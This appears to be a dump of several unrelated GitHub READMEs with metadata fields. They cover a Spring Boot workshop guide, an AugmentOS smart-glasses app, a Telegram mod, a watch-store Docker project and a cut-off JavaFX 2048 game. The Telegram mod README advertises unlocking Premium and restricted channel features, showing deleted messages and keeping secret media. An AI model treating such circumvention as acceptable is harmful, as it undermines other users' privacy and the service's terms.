    public ResponseEntity<User> createUser(@RequestBody UserRequest request) {}
    ```

### GraphQL

GraphQL is a query language and runtime for APIs that allows clients to request specific data structures and receive exactly that data, replacing the need for multiple REST endpoints with a single flexible endpoint.

GraphQL addresses several key API development challenges:

* Over/Under-fetching: Clients specify exactly what data they need, eliminating unnecessary data transfer and reducing API calls
* Multiple Resource Fetching: Single request can retrieve data from multiple resources, replacing multiple REST endpoints
* Type Safety: Strong type system ensures data consistency and provides better development-time validation
* Schema Evolution: Enables adding fields without breaking existing queries, making API versioning more manageable
* Real-time Updates: Built-in subscription support for live data updates
* Documentation: Self-documenting through introspection, schemas automatically generate documentation
* Frontend Development Speed: Flexible data fetching reduces frontend-backend coordination and API endpoint negotiations

Spring for GraphQL integrates GraphQL into Spring applications, solving several key problems:

* Schema-First Development: Enables defining GraphQL schemas separately from code, improving API design and documentation
* Integration with Spring ecosystem: Seamlessly connects GraphQL operations with Spring components, controllers, and security features
* DataFetcher Mapping: Automatically maps GraphQL fields to corresponding Spring beans and methods, reducing boilerplate code
* Subscription Support: Built-in handling of real-time updates through WebSocket integration
* Error Handling: Standardized exception handling and error responses consistent with Spring's error management

http://localhost:8080/graphiql

```graphql
{
  posts {
    id
    content
    commentCount
    author {
      username
    }
    createdAt
    draft
    reactionCount
    tags {
      name
    }
    comments {
      content
      createdAt
      reactions {
        type
      }
    }
  }
}
```

#### GraphQL Resources

- [GraphQL](https://graphql.org/)
- [Spring for GraphQL Documentation](https://docs.spring.io/spring-graphql/reference/index.html)
- [My YouTube GraphQL Playlist](https://www.youtube.com/playlist?list=PLZV0a2jwt22slmUC9iwGGWfRQRIhs1ELa)

## Configuration

### Hardcoding Configuration Values

Spring Boot applications commonly struggle with hardcoded configuration values and environment-specific settings.

```java
@Repository
public class PostRepository {
    // ‚ùå Hardcoded configuration values
    private static final int MAX_SEARCH_RESULTS = 100;
    private static final String DEFAULT_SORT_ORDER = ""DESC"";
    
    public List<Post> search(String keyword) {
        return jdbcClient.sql(POST_WITH_RELATIONS_SQL +
            "" WHERE p.content ILIKE :keyword "" + 
            ""ORDER BY p.created_at "" + DEFAULT_SORT_ORDER + 
            "" LIMIT "" + MAX_SEARCH_RESULTS)
            .param(""keyword"", ""%"" + keyword + ""%"")
            .query(Post.class)
            .list();
    }
}
```

#### 1. Externalize Configuration in application.yaml

```yaml
spring:
  application:
    name: scm-workshop
  sql:
    init:
      mode: always
    
app:
  post:
    search:
      max-results: 100
      default-sort: DESC
  feeds:
    cache-ttl: 3600
    batch-size: 50
```

#### 2. Create Configuration Properties Class

```java
@ConfigurationProperties(prefix = ""app.post.search"")
@Component
record PostSearchProperties(
    @DefaultValue(""100"") Integer maxResults,
    @DefaultValue(""DESC"") String defaultSort
) {}
```

Creating a configuration properties class provides several key benefits beyond just IDE intellisense:

* Type Safety: Validates configuration at startup, catching misconfigurations early
* Strong Typing: Converting string values to proper types (Integer, Boolean, etc.) automatically
* Default Values: Built-in support for fallback values using @DefaultValue
* Documentation: IDE tooltips and completion for available properties, making configuration more discoverable
* Validation: Can add validation annotations (@Min, @Max, etc.) to enforce constraints
* Modular Config: Groups related properties together logically vs scattered @Value annotations
* Testing: Easier to create test configurations with builder patterns
* Refactoring: IDE support for renaming properties across codebase

#### 3. Use Configuration in Code

```java
@Repository
public class PostRepository {
    private final PostSearchProperties searchProperties;
    
    public PostRepository(JdbcClient jdbcClient, 
                         ObjectMapper objectMapper,
                         PostSearchProperties searchProperties) {
        this.jdbcClient = jdbcClient;
        this.objectMapper = objectMapper;
        this.searchProperties = searchProperties;
    }
    
    public List<Post> search(String keyword) {
        return jdbcClient.sql(POST_WITH_RELATIONS_SQL +
            "" WHERE p.content ILIKE :keyword GROUP BY p.id, u.id "" + 
            ""ORDER BY p.created_at "" + searchProperties.defaultSort() + 
            "" LIMIT "" + searchProperties.maxResults())
            .param(""keyword"", ""%"" + keyword + ""%"")
            .query(Post.class)
            .list();
    }
}
```

**Benefits**

1. **Environment-Specific Values**: Different configurations for dev/staging/prod
2. **Version Control**: Track configuration changes in source control
3. **Validation**: Type-safe configuration with validation at startup
4. **Flexibility**: Override via environment variables or command line
5. **Testing**: Easy configuration overrides for testing scenarios

**Best Practices:**

1. Use meaningful property names and hierarchical structure
2. Group related properties using nested objects
3. Provide sensible defaults using `@DefaultValue`
4. Validate configuration values at startup
5. Use profiles for environment-specific values
6. Document configuration properties
7. Avoid sensitive data in configuration files

**Environment-Specific Configuration**

```yaml
# application-dev.yaml
app:
  post:
    search:
      max-results: 50
      default-sort: DESC

# application-prod.yaml
app:
  post:
    search:
      max-results: 100
      default-sort: DESC
```

Activate profiles using:
- `spring.profiles.active` property
- Environment variable: `SPRING_PROFILES_ACTIVE=prod`
- Command line: `--spring.profiles.active=prod`

### Environment Variables 

An environment variable is a dynamic value stored at the operating system level that can be used by applications to configure 
their behavior, with common examples being database credentials, API keys, or service URLs that may change between 
different environments (development, staging, production).

```java
# ‚ùå Hardcoded sensitive values in application.yaml
spring:
  datasource:
    url: jdbc:postgresql://production-db.thoughtstream.com:5432/thoughtstream
    username: admin
    password: supersecret123
  
security:
  jwt:
    secret: my-ultra-secure-and-ultra-long-secret-key
    expiration: 86400000
```

```java
spring:
  datasource:
    url: ${DATABASE_URL}
    username: ${DATABASE_USERNAME}
    password: ${DATABASE_PASSWORD}
  
security:
  jwt:
    secret: ${JWT_SECRET}
    expiration: ${JWT_EXPIRATION:86400000}
```

Here's how to set environment variables in both operating systems:

Windows (Command Prompt):
```shell
set DATABASE_URL=postgresql://localhost:5432/db
```

macOS/Linux (Terminal):
```shell
export DATABASE_URL=postgresql://localhost:5432/db
```

To make these permanent:
* Windows: Set through System Properties > Environment Variables
* macOS: Add to ~/.zshrc or ~/.bash_profile

You can also set this in IntelliJ by going to Run > Edit Configurations > Environment Variables.

## Performance

### Virtual Threads

Virtual Threads, introduced in Java 21, solve a fundamental problem in server applications: the limited number of platform threads for handling concurrent operations.

#### The Problem

Traditional server applications use platform threads (OS threads) to handle requests. When a request performs blocking I/O (database queries, HTTP calls, file operations), the thread is blocked and unavailable for other work. This leads to:

* Limited concurrent requests (typical max: few hundred threads)
* Wasted resources during I/O operations
* Reduced application scalability
* Need for complex async programming

#### Virtual Threads Solution

Virtual Threads are lightweight threads that don't map 1:1 with OS threads. When a Virtual Thread performs blocking I/O:

* It's unmounted from the platform thread
* Stored in heap memory
* Remounted when I/O completes

This allows:

* Millions of concurrent Virtual Threads (The illusion of infinite scalability)
* Efficient use of system resources
* Simple synchronous programming model
* Better scalability for I/O-bound applications

#### Enabling Virtual Threads in Spring Boot 3.2+

Add to application.properties / application.yaml:

```properties
spring.threads.virtual.enabled=true
```

#### Example

```java
@RestController
@RequestMapping(""/api"")
public class ExampleController {

    private final RestClient restClient;
    private static final Logger log = LoggerFactory.getLogger(ExampleController.class);

    public ExampleController(RestClient.Builder builder) {
        this.restClient = builder.baseUrl(""https://api.example.com"").build();
    }

    @GetMapping(""/data"")
    public String getData() {
        // Blocking operation - ideal for Virtual Threads
        ResponseEntity<String> response = restClient.get()
            .uri(""/some-endpoint"")
            .retrieve()
            .toEntity(String.class);
            
        log.info(""Executed on thread: {}"", Thread.currentThread());
        return response.getBody();
    }
}
```

Virtual threads in Spring Boot 3.2+ are enabled in the following components:

1. Tomcat (Web Server)
   * Handles incoming HTTP requests using virtual threads
   * Replaces the default platform thread pool

2. @Async methods
   * When using @EnableAsync
   * Default executor uses virtual threads

3. @Scheduled tasks
   * When using @EnableScheduling
   * Task executor uses virtual threads

4. WebClient & RestClient
   * HTTP client operations use virtual threads


What about when you aren't in one of those components? You can create your own virtual thread executor:

```java
@Component
public class VirtualThreadDemo implements CommandLineRunner {

    private final Logger log = LoggerFactory.getLogger(VirtualThreadDemo.class);
    private final RestClient restClient;

    public VirtualThreadDemo(RestClient.Builder builder) {
        this.restClient = builder.baseUrl(""https://httpbin.org"").build();
    }

    @Override
    public void run(String... args) throws Exception {
        try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {
            // Submit multiple tasks
            List<Future<String>> futures = IntStream.range(0, 10)
                .mapToObj(i -> executor.submit(() -> makeBlockingCall(i)))
                .toList();

            // Wait for all tasks to complete
            for (Future<String> future : futures) {
                log.info(future.get());
            }
        }
    }

    private String makeBlockingCall(int i) {
        ResponseEntity<Void> response = restClient.get()
            .uri(""/delay/2"")
            .retrieve()
            .toBodilessEntity();
            
        return ""Task %d completed on %s"".formatted(i, Thread.currentThread());
    }
}
```

### Native Images

GraalVM Native Images convert Java applications into standalone native executables, offering:

* Fast startup time (milliseconds vs seconds)
* Lower memory usage
* Reduced docker image size
* Improved serverless performance

Add to your pom.xml: 

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.graalvm.buildtools</groupId>
            <artifactId>native-maven-plugin</artifactId>
        </plugin>
    </plugins>
</build>
```

```shell
# build
./mvnw -Pnative native:compile -DskipTests

# Cloud Native Buildpacks
./mvnw spring-boot:build-image
```

GraalVM native images operate on a ""closed world assumption"" - all code must be known at build time. Any runtime dynamic behavior like reflection, resource loading, or proxy creation requires explicit configuration through GraalVM hints. This fundamentally changes how you architect Spring applications, as common patterns like classpath scanning and dynamic bean creation need special consideration.

```java
@Component
public class MyRuntimeHints implements RuntimeHintsRegistrar {
    @Override
    public void registerHints(RuntimeHints hints, ClassLoader classLoader) {
        hints.resources()
                .registerPattern(""/data/*.json"");
    }
}
```

You can run the native image from the target directory:

```shell
# Run the native image 
./target/scm-workshop

# Run the native image with a profile
./target/scm-workshop -Dspring.profiles.active=prod 
```

[Native Iamge Documentaiton](https://docs.spring.io/spring-boot/reference/packaging/native-image/index.html)

## Testing

### Overusing @SpringBootTest

@SpringBootTest loads the entire application context for integration testing. While useful for verifying the full stack, overusing it can lead to bloated test suites, longer build times, and reduced efficiency.

When to Use `@SpringBootTest`:

* Integration Tests: To verify multiple components work together.
* End-to-End Scenarios: To validate the full request-response cycle.

When Not to Use @SpringBootTest

* Unit Tests: For testing a single class, @SpringBootTest is overkill. Use mocks to isolate dependencies.
* Layer-Specific Tests: Use slice annotations to test specific layers:
* Performance Considerations: @SpringBootTest can slow down tests. Slice tests are faster and more focused.

#### Available Slice Test Annotations

**Controller Layer: **
* `@WebMvcTest`: For testing MVC controllers without starting the full web server
    - Loads only web-related components (controllers, filters, etc.)
    - Useful for testing endpoint behavior and request/response handling

**Data Layer:**
* `@DataJpaTest`: For testing JPA repositories
    - Configures in-memory database
    - Loads JPA-related components only

* `@DataMongoTest`: For testing MongoDB repositories
    - Configures in-memory MongoDB
    - Perfect for testing MongoDB-specific operations and queries

* `@JdbcTest`: For testing JDBC operations
    - Sets up a basic JDBC environment
    - Useful when working directly with JdbcTemplate

**JSON Processing:**
* `@JsonTest`: For testing JSON serialization/deserialization
    - Loads JSON mapping infrastructure
    - Ideal for testing DTOs and JSON conversions

**Reactive Applications:**
* `@WebFluxTest`: For testing WebFlux controllers
    - Loads reactive web components
    - Perfect for testing reactive endpoints and flows

**External Services:** 
* `@RestClientTest`: For testing REST clients
    - Configures a mock web server
    - Useful for testing external API integrations without making real HTTP calls

**Custom Slices:**

You can create custom slice tests by combining annotations to test specific layers or components:
```java
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@DataJpaTest
@AutoConfigureTestDatabase
@ComponentScan(basePackages = ""com.example.service"")
public @interface ServiceTest {}
```

**Best Practices**

1. Choose the most specific slice test for your needs
2. Mock dependencies in slice tests
3. Keep tests focused on a single layer or responsibility
4. Consider test execution time when choosing between full context and slice tests

By using slice tests strategically, you can create faster, more maintainable test suites without the performance hit.

### Insufficient Unit Testing

Unit tests are critical because they verify that individual components work correctly in isolation and catch bugs early in development, but they're often neglected because developers feel pressured to deliver features quickly and may view thorough testing as slowing down development velocity. Additionally, writing good unit tests requires a deep understanding of testing principles and extra time investment upfront, which can be challenging when facing tight deadlines.

I'm using Generative AI heavily for this right now

```java
@WebMvcTest(PostController.class)
class PostControllerTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private PostRepository repository;

    @Autowired
    private ObjectMapper objectMapper;

    @TestConfiguration
    static class TestConfig {
        @Bean
        public PostRepository postRepository() {
            return mock(PostRepository.class);
        }
    }

    @Test
    void findAll_ShouldReturnPosts() throws Exception {
        Post post1 = new Post(1L, ""Content 1"", LocalDateTime.now(), List.of(), List.of(), List.of(), new User(1L, ""Author 1"", ""author1@example.com"", ""hashedPassword1"", null, List.of(), List.of(), Role.USER), List.of(), false, Visibility.PUBLIC);
        Post post2 = new Post(2L, ""Content 2"", LocalDateTime.now(), List.of(), List.of(), List.of(), new User(2L, ""Author 2"", ""author2@example.com"", ""hashedPassword2"", null, List.of(), List.of(), Role.USER), List.of(), false, Visibility.PUBLIC);

        given(repository.findAll()).willReturn(Arrays.asList(post1, post2));

        mockMvc.perform(get(""/api/posts""))
                .andExpect(status().isOk())
                .andExpect(content().contentType(MediaType.APPLICATION_JSON))
                .andExpect(jsonPath(""$[0].content"").value(""Content 1""))
                .andExpect(jsonPath(""$[1].content"").value(""Content 2""));
    }

    // More tests...

}
```

## Security

### Not Adopting Secure by Default (""Fail Closed"")

When it comes to security, ""default"" settings are often your first line of defense. In the context of Spring Security, developers need to adopt a ""secure by default"" approach, also known as ""fail closed."" This means that, unless explicitly specified, all endpoints should be secured. The alternative‚Äîfailing open‚Äîcan lead to unintended access vulnerabilities, where sensitive parts of your application become accessible to unauthorized users.

The guiding principle should be: if access rules are not explicitly defined, deny access. This ensures that any oversight or mistake doesn‚Äôt inadvertently expose sensitive endpoints.

**Common Mistake: Failing Open**

A common mistake developers make is using `.anyRequest().permitAll()`. This configuration is effectively turning off security for all endpoints, making your entire application publicly accessible. It might seem convenient during testing or initial development, but it‚Äôs incredibly risky to leave such settings in place for production.

```java
// Example of what not to do
http
    .authorizeRequests()
    .anyRequest().permitAll();
```

In this example, no authentication is required for any request, leaving all resources open for public access. It‚Äôs easy to forget to modify this configuration, leading to severe security gaps.

**Best Practice: Failing Closed**

Instead, developers should adopt a more restrictive approach, either requiring authentication for all requests or denying access by default.

```java
// Example of secure configuration
http
    .authorizeRequests()
    .anyRequest().authenticated();
```

In this setup, every request requires authentication unless specified otherwise. This way, if a developer forgets to add a specific rule, the system defaults to secure behavior. Alternatively, you could use `.denyAll()` to completely block requests that do not have explicit permissions:

```java
// Example to deny all by default
http
    .authorizeRequests()
    .anyRequest().denyAll();
```

By adopting a fail-closed approach, you ensure that no resource is unintentionally exposed, and your application remains secure by default. It‚Äôs a small adjustment that can prevent significant vulnerabilities.

### Implementing your own JwtFilter

Another common mistake developers make is creating their own `JwtFilter` for handling JWT (JSON Web Token) authentication. While it might seem like a good idea to have full control over the JWT validation process, this approach can lead to numerous security pitfalls, such as incorrect token validation, missed security updates, or improper error handling.

Spring Security provides built-in support for handling JWTs through its OAuth2 Resource Server support. This allows developers to leverage well-tested, community-driven solutions that handle most of the complexities of JWT validation for you.

```java
// Example of what not to do
public class CustomJwtFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        // Custom JWT validation logic
    }
}
```

Creating a custom JWT filter like this can be error-prone and makes the application more difficult to maintain.

**Best Practice: Using OAuth2 Resource Server Support**

Instead of creating a custom JWT filter, developers should use the built-in OAuth2 Resource Server support in Spring Security. This feature simplifies the process of validating JWTs and ensures that security best practices are followed.

```java
// Example of secure configuration
http
    .oauth2ResourceServer()
    .jwt();
```

With this configuration, Spring Security takes care of validating the JWT, managing expiration, and handling errors. This approach not only reduces the risk of introducing vulnerabilities but also makes your application easier to maintain and keep up to date with security best practices.

By using OAuth2 Resource Server support, you can trust that your application is following industry standards for JWT validation, without the need for custom, error-prone code.

[Spring Security JWT Blog Post](https://www.danvega.dev/blog/spring-security-jwt)

## Resources

[This Repository](https://github.com/danvega/scm-workshop)

### Spring
- [Spring](https://spring.io)
- [Spring Academy](https://spring.academy/)
- [Spring Blog](https://spring.io/blog)
- [GitHub Spring Projects](https://github.com/spring-projects)
- [Spring Initializr](https://start.spring.io/)
- [Spring Calendar](https://calendar.spring.io/)

### Documentation

- [Spring Framework Reference](https://docs.spring.io/spring-framework/docs/current/reference/html/)
- [Spring Framework API](https://docs.spring.io/spring-framework/docs/current/javadoc-api/)
- [Spring Boot Reference](https://docs.spring.io/spring-boot/docs/current/reference/html/index.html)
- [Spring Boot API](https://docs.spring.io/spring-boot/docs/current/api/)
- [Spring Boot Guides](https://spring.io/guides)

### Dan Vega

- [Dan Vega](https://www.danvega.dev/)
- [YouTube](https://www.youtube.com/c/DanVega)
- [Twitter](https://twitter.com/therealdanvega)
- [BlueSky](https://bsky.app/profile/danvega.dev)
- [LinkedIn](https://www.linkedin.com/in/danvega/)
- [GitHub](https://github.com/danvega/)

## Notes

- Docker Desktop needs to be running
- Browswer Tabs
  - [This Repository](https://github.com/danvega/scm-workshop)
  - [Spring Initializr](https://start.spring.io/)
    - Spring Init Features ü§©
- Branches
  - main
  - start-here
  - data-access-here
  - web-apis-start
  - performance-start
",0,0,5,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,7.0
AugmentOS-Community/AugmentOS-Example-App,main,"# Example AugmentOS App

This repository provides a **bare-bones example** of how to build a Third-Party App (TPA) for **[AugmentOS](https://www.augmentos.org/)**, the operating system for smart glasses. If you want to get started with building apps for AugmentOS, start here.

---

# How to make an AugmentOS app

## **Braindead Mode: Clone This Repo**

If you just want to dive in:
1. Clone this repo.
2. [Install AugmentOSLib](#augmentoslib-installation)
3. Build and deploy the app to your AugmentOS Puck or other device running AugmentOS Core.

You're now running an AugmentOS TPA!

---

## **Easy Mode: Start from Scratch**

If you want to start from scratch:
1. Start a fresh Android Studio Project.
2. [Install AugmentOSLib](#augmentoslib-installation)
3. Add the following to your app's `AndroidManifest.xml` file:

```
<service android:name=""com.yourpackage.YourAugmentosService""
    android:exported=""true"">
    <!-- Intent filter required to communicate with AugmentOS -->
    <intent-filter>
        <action android:name=""AUGMENTOS_INTENT"" />
    </intent-filter>
</service>
```

4. Create a `tpa_config.json` file in `app/src/main/res/raw/`:

```json
{
  ""name"": ""Example App"",
  ""description"": ""Example App Description"",
  ""version"": ""1.0.0"",
  ""settings"": [
    {
      ""key"": ""enableLogging"",
      ""type"": ""toggle"",
      ""label"": ""Enable Logging"",
      ""defaultValue"": true
    },
    {
      ""key"": ""username"",
      ""type"": ""text"",
      ""label"": ""Username"",
      ""defaultValue"": ""JohnDoe""
    },
    {
      ""key"": ""volumeLevel"",
      ""type"": ""slider"",
      ""label"": ""Volume Level"",
      ""min"": 0,
      ""max"": 100,
      ""defaultValue"": 50
    }
  ]
}
```

5. Build and deploy the app to your AugmentOS Puck or other device running AugmentOS Core.

You're now running an AugmentOS TPA!

---

## **AugmentOSLib installation**

1. Clone the [AugmentOS repository](https://github.com/augmentos/augmentos) next to your app's directory (default setup)

2. If you cloned the [AugmentOS repository](https://github.com/augmentos/augmentos) elsewhere, update the path to AugmentOSLib in `settings.gradle`:
   ```
   project(':AugmentOSLib').projectDir = new File(rootProject.projectDir, '../AugmentOS/augmentos_android_library/AugmentOSLib')
   ```

---

## **How It Works**

### **Service-Based Architecture**
- The core of this app is a foreground service (`ExampleAugmentosAppService`) that extends `SmartGlassesAndroidService`.
- This service allows the app to:
  - Communicate with the AugmentOS Core.
  - Subscribe to data streams like transcription and phone notifications
  - Display content directly on the smart glasses.

## **AugmentOSLib**

The library interacts with AugmentOS in a few ways:
- Data Subscriptions
- Display Requests
- Access & Modify AugmentOS Settings

---

### **Data Subscriptions**

The app can subscribe to a variety of data streams and handle the incoming events:

```java
// Request English transcriptions 
augmentOSLib.requestTranscription(""English"");
    
// Get them like this
@Subscribe
public void onSpeechTranscriptionTranscript(SpeechRecOutputEvent event) {}
```

```java
// Request translated English transcriptions from Spanish
augmentOSLib.requestTranslation(""Spanish"", ""English"");

// Get them like this
@Subscribe
public void onSpeechTranslationTranscript(TranslateOutputEvent event) {}
```

```java
// Request phone notifications
augmentOSLib.requestNotifications();

// Get them like this
@Subscribe
public void onNotificationEvent(NotificationEvent event) {}
```

(COMING SOON)
```java
// Request glasses button taps
augmentOSLib.requestGlassesSideTaps();

// Get them like this
@Subscribe
public void onGlassesSideEvent(GlassesSideTapEvent event) {}
```

(COMING SOON)
```java
// Request smart ring button taps
augmentOSLib.requestSmartRingButtonTaps();

// Get them like this
@Subscribe
public void onSmartRingButtonTapEvent(SmartRingButtonTapEvent event) {}
```
--- 

### Displaying content on smart glasses
      
**Reference cards**:
```java
augmentOSLib.sendReferenceCard(""Title"", ""Body text."");
```
**Bullet point lists**:
  ```java
  augmentOSLib.sendBulletPointList(""Title"", new String[] {""Point 1"", ""Point 2""});
  ```
**Centered text**:
  ```java
  augmentOSLib.sendCenteredText(""Centered Text Example"");
  ```
**Text wall**:
  ```java
  augmentOSLib.sendTextWall(""This is a block of text that fills the screen."");
  ```
**Double text wall**
```java
augmentOSLib.sendDoubleTextWall(""Top Text"", ""Bottom Text"");
```
**Row cards**:
```java
augmentOSLib.sendRowsCard(new String[] {""Row 1"", ""Row 2"", ""Row 3""});
```
**(COMING SOON) Bitmap images**:
```java
augmentOSLib.sendBitmap(myBitmap);
```
**(COMING SOON) Custom layouts via JSON**:
```java
augmentOSLib.sendCustomContent(""{ \""custom\"": \""layout\"" }"");
```

---

### Access & Modify AugmentOS Settings

**To start, specify a settings object in your `tpa_config.json`**

```
{
  ""name"": ""Example App"",
  ""description"": ""An example app for AugmentOS"",
  ""version"": ""1.0.0"",
  ""settings"": [
    {
      ""key"": ""exampleToggleSetting"",
      ""type"": ""toggle"",
      ""label"": ""This is a toggle"",
      ""defaultValue"": true
    },
    {
      ""key"": ""exampleTextSetting"",
      ""type"": ""text"",
      ""label"": ""This is a text box"",
      ""defaultValue"": ""Some good default here""
    },
    {
      ""key"": ""exampleSliderSetting"",
      ""type"": ""slider"",
      ""label"": ""This is a slider"",
      ""min"": 0,
      ""max"": 100,
      ""defaultValue"": 50
    },
    {
      ""key"": ""selectInfoText"",
      ""type"": ""titleValue"",
      ""label"": ""This is a select dropdown"",
      ""value"": ""Use this to have users select one of a few options""
    },
    {
      ""key"": ""exampleSelectSetting"",
      ""type"": ""select"",
      ""label"": ""Color Scheme"",
      ""options"": [
        { ""label"": ""Light"",  ""value"": ""light"" },
        { ""label"": ""Dark"",   ""value"": ""dark"" },
        { ""label"": ""System"", ""value"": ""system"" }
      ],
      ""defaultValue"": ""system""
    },
    {
      ""key"": ""selectInfoText"",
      ""type"": ""titleValue"",
      ""label"": ""This is a multiselect"",
      ""value"": ""Use this to have users select one or more of a few options""
    },
    {
      ""key"": ""exampleMultiselectSetting"",
      ""type"": ""multiselect"",
      ""label"": ""Favorite Colors"",
      ""options"": [
        { ""label"": ""Red"",    ""value"": ""red"" },
        { ""label"": ""Green"",  ""value"": ""green"" },
        { ""label"": ""Blue"",   ""value"": ""blue"" },
        { ""label"": ""Yellow"", ""value"": ""yellow"" }
      ],
      ""defaultValue"": [""red"", ""blue""]
    }
  ]
}
```

**Access settings within your app**
```java
AugmentOSSettingsManager.getBooleanSetting(this, ""exampleToggleSetting"");

AugmentOSSettingsManager.getStringSetting(this, ""exampleTextSetting"");

AugmentOSSettingsManager.getSliderSetting(this, ""exampleSliderSetting"");

AugmentOSSettingsManager.getSelectSetting(this, ""exampleSelectSetting"");

AugmentOSSettingsManager.getMultiSelectSetting(this, ""exampleMultiselectSetting"");
```

**Modify settings within your app**
```java
AugmentOSSettingsManager.setBooleanSetting(this, ""exampleToggleSetting"", true);

AugmentOSSettingsManager.setStringSetting(this, ""exampleTextSetting"", ""New value!"");

AugmentOSSettingsManager.setSliderSetting(this, ""exampleSliderSetting"", 42);

AugmentOSSettingsManager.setSelectSetting(this, ""exampleSelectSetting"", ""Dark"");

AugmentOSSettingsManager.setMultiSelectSetting(this, ""test"", Arrays.asList(""Blue"", ""Red""));
```
---

## **License**

This project is licensed under the MIT License. See the `LICENSE` file for more details.
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0
mustafa1dev/TeleVip-Lsposed,main,"# TeleVip LSPosed

A module for modifying Telegram with the following features:

1. Hide ""Seen"" status for groups, channels, and private messages.

2. Hide ""Typing..."" indicator.

3. Hide story view status.

4. Unlock all restricted and encrypted features for channels.

5. Boost Telegram download speed.

6. Enable Telegram Premium features.

7. Save stories to the gallery, including those that cannot normally be saved.

8. Change name (Note: The name changes only on your device).

9. Hide Phone Number

10. Hide Online Status

11. Prevent Deletion of Secret Media

12. Show Deleted Messages

13. Disable Stories

There are additional features that are not listed here.

# Support clients
1. Telegram 11.6.1 (55852)
2. Plus 11.5.3.0 (21340)
3. TG Connect 11.0.1 (1100109)
4. Nagram 11.5.3 (1202)
5. Skygram 10.20.6 (40639)
6. iMe 11.5.3 (11050302)
7. X Plus 11.5.4 (55159)
8. Cherrygram 11.5.3 (55110)
9. Nicegram 1.39.3 (1529)
10. Telegram web 11.6.1 (55859)
11. Telegram Beta 11.6.2 (56159)
12. exteraGram 11.5.3 (55119)
13. Nekogram 11.5.3S (55150)
14. ForkGram 11.5.3.0 (551108)
15. ForkClient Beta 11.5.3.0 (551109)

Developed by an @mustafa1dev
",7,20,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
quoc10973/Watch-Store-Management,main,"# Watch-Store-Management
An old version java web project about watch e-commerce using netbeans 8 with JDK1.8 and Apache Tomcat 8.0.27. This project also contain dockerfile, database.sql to create in Microsoft SQL Server. 

# Docker build (CMD)
- To build image:

docker build -t watchstoremanagement .

- To ruin container:

docker run -d -p 8080:8080 --name watchstoremanagement-container watchstoremanagement

- Then you can go to url home page:

http://localhost:8080/WatchStoreManagement
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hoangsonww/Game-2048-JavaFX,master,"# 2048 Game in JavaFX

This is a JavaFX implementation of the popular **2048 puzzle game**, where the objective is to slide tiles on a grid to combine them into a tile with the value **2048**. This implementation includes animations, styling, and responsive UI design, offering an enjoyable experience for players.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Preview](#preview)
- [Gameplay](#gameplay)
- [Objective](#objective)
- [Controls](#controls)
- [How It Works](#how-it-works)
- [Code Structure](#code-structure)
- [Styling](#styling)
- [Installation](#installation)
- [Usage](#usage)
- [File Structure](#file-structure)
- [Known Issues](#known-issues)
- [Contributing](#contributing)
- [License](#license)
- [Acknowledgments](#acknowledgments)

## Overview

The 2048 game is a single-player sliding block puzzle game where the player combines tiles to create a tile with the value **2048**. The game is played on a 4x4 grid, with tiles that slide in four directions (Up, Down, Left, Right). When two tiles with the same value collide, they merge into a single tile with double the value. The game continues until no valid moves are left.

**Architecture**: The game follows the Model-View-Controller (MVC) pattern, with separate classes for game logic, UI interactions, and rendering. The main class `Game2048` manages the game grid, user inputs, and animations, while the `Main` class initializes the game window and handles event listeners. The game is styled with modern aesthetics, featuring rounded borders, color-coded tiles, and proper alignment of UI elements.

**Technology Stack**: The game is built using JavaFX, a Java library for building rich client applications. It uses FXML for defining the UI layout and CSS for styling the game. The project is managed using Maven, with dependencies for JavaFX and JUnit for testing. Also used CSS for styling the game.

## Features

- **Interactive Gameplay**: Use arrow keys to move tiles (Up, Down, Left, Right).
- **Score Tracking**: Displays current and best scores at the top of the game.
- **Responsive UI**:
  - Animated tile movements and merging effects.
  - Color-coded tiles based on values for easy recognition.
  - Modern styling with rounded borders and proper alignment.
- **Game State Management**:
  - Automatically adds new tiles after each move.
  - Checks for available moves and detects game over conditions.
- **Intelligent Animations**:
  - Smooth scaling animations for tile appearances and merges.
  - Dynamic color updates based on tile values.
- **Build Automation**:
  - Maven project configuration for easy setup and dependency management.
  - JUnit testing for validating game logic and state transitions.

## Preview

### Welcome Screen

<p align=""center"">
  <img src=""img/welcome.png"" alt=""2048 Game in JavaFX"" width=""70%"" style=""border-radius: 8px"">
</p>

### Game Interface

<p align=""center"">
  <img src=""img/ui.png"" alt=""2048 Game in JavaFX"" width=""70%"" style=""border-radius: 8px"">
</p>

### Instructions Interface

<p align=""center"">
  <img src=""img/instructions.png"" alt=""2048 Game in JavaFX"" width=""70%"" style=""border-radius: 8px"">
</p>

## Gameplay

### Objective

Combine tiles with the same value to create a tile with the value **2048** or higher. The game ends when no valid moves are left.

> **Note:** The game can be won by creating a tile with the value **2048** or higher. The player can continue playing even after reaching the 2048 tile.

### Controls

- **Arrow Keys**:
  - **Up**: Moves all tiles upward.
  - **Down**: Moves all tiles downward.
  - **Left**: Moves all tiles to the left.
  - **Right**: Moves all tiles to the right.
- **New Game** Button: Resets the game.
- **Exit Game** Button: Closes the application.

## How It Works

### Game Mechanics

1. **Sliding and Merging**:
  - Tiles slide in the direction of the arrow key pressed.
  - Tiles with the same value merge into one tile, doubling their value.
  - A tile can merge only once per move.
2. **Adding New Tiles**:
  - After every valid move, a new tile (value `2` or `4`) appears in a random empty spot.
3. **Game Over**:
  - The game checks for possible moves after each action.
  - If no moves are available (all tiles are full and non-mergeable), the game ends.

### Code Structure

The game is built using JavaFX, following Model-View-Controller (MVC) architecture for clean separation of concerns. The key components are:

#### **1. Class: `Game2048`**
This is the main class responsible for rendering the game grid, handling user inputs, managing the board state, and applying animations.

Key Components:
- **Grid Management**:
  - `SIZE`: Size of the grid (default is 4x4).
  - `board`: 2D array representing the logical state of the grid.
  - `tiles`: 2D array of `StackPane` objects representing the UI tiles.
- **UI Elements**:
  - `scoreLabel`: Displays the current score.
  - `bestScoreLabel`: Displays the best score achieved.
- **Tile Colors**:
  - Dynamically updates colors and text based on tile values.
- **Animations**:
